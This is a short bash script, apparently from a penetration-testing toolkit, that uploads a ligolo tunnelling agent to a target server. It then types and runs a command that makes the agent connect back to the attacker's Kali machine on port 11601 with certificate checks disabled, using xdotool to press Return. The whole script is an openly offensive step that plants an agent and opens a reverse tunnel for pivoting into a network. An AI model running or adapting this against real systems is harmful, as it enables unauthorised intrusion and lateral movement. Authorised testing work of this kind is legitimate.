#!/bin/bash

: '
download ligolo agent to server and connect to proxy
'

LOCATION="${SCRIPTS_DIR}/portListening/ligolo/.files"
FILE="agent"

curl_upload_file "${LOCATION}" "${FILE}"
sleep 3

paste_command "${FILE_LOCATION} -connect ${KALI_IP}:11601 -ignore-cert"
xdotool key Return
